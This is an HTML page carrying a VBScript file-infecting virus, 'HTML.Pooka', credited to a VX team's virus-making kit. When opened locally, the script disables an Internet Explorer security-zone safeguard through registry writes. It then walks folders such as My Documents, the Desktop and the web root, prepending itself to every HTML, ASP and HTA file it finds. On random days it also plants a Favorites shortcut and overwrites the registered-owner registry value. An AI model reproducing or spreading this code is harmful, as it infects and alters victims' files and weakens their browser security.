<!--Pooka-->
<HTML><BODY>
<Script Language="VBScript">
<!--
'HTML.Pooka
'By -KD-
'Made with Simple HTML Virus Kit 1.1K
'By -KD- [Metaphase VX Team & NoMercyVirusTeam]
On Error Resume Next
If location.protocol = "file:" then
 Randomize
 Set WshShell = CreateObject("WScript.Shell")
 WshShell.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, "REG_DWORD"
 WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, "REG_DWORD"
  If location.protocol = "file:" then
   Set FSO = CreateObject("Scripting.FileSystemObject")
   HPath = Replace(location.href, "/", "\")
   HPath = Replace(HPath, "file:\\\","")
   HPath = FSO.GetParentFolderName(HPath)
   Set TRange = document.body.createTextRange
   Call GetFolder(HPath)
   Call GetFolder("C:\My Documents")
   Call GetFolder("C:\Windows\Desktop")
   Call GetFolder("C:\Inetpub\wwwroot")
 End If
 If Day(Now()) = Int(Rnd * 6) + 1 Then
   MsgBox("Hello World!")
   Set PookaLink = WshShell.CreateShortcut("C:\WINDOWS\Favorites\Pooka.URL")
   PookaLink.TargetPath = "http://www.coderz.net/"
   PookaLink.Save
   WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOwner", "Pooka"
 End If
End If
Sub GetFolder(InfPath)
On Error Resume Next
If FSO.FolderExists(InfPath) Then
 Do
  Set FolderObj = FSO.GetFolder(InfPath)
  InfPath = FSO.GetParentFolderName(InfPath)
  Set FO = FolderObj.Files
  For each target in FO
    ExtName = lcase(FSO.GetExtensionName(target.Name))
    If ExtName = "htt" or ExtName = "asp" or ExtName = "htm" or ExtName = "hta" or ExtName = "htx" or ExtName = "html" then
    Set Pooka = FSO.OpenTextFile(target.path, 1, False)
    If Pooka.readline <> "<!--Pooka-->" then
    Pooka.close()
    GetFile(target.path)
    Else
     Pooka.close()
    End If
  End If
  Next
  Loop Until FolderObj.IsRootFolder = True
End If
End Sub

Sub GetFile(GetFileName)
Set Pooka = FSO.OpenTextFile(GetFileName, 1, False)
FileContents = Real.ReadAll()
Pooka.close()
Set Pooka = FSO.OpenTextFile(GetFileName, 2, False)
Pooka.WriteLine "<!--Pooka-->"
Pooka.Write("<html><body>" + Chr(13) + Chr(10))
Pooka.WriteLine TRange.htmlText
Pooka.WriteLine("</body></html>")
Pooka.Write(FileContents)
Pooka.close()
End Sub

-->
</script>
</BODY></HTML>

<HTML><HEAD><TITLE>HTML.Pooka</TITLE></HEAD>
</BODY><CENTER>
<Font Size="6" Face="Arial"><P>
HTML.Pooka <BR>By -KD- <BR><BR>
<MARQUEE BGCOLOR="#008080"><FONT COLOR="#FFFFFF"><B>Made with
 Simple HTML Virus Kit 1.1K by -KD- 
[Metaphase VX Team &amp; NoMercyVirusTeam]</B></FONT></MARQUEE>
Do not edit this file with a HTML editor
<CENTER></BODY></HTML>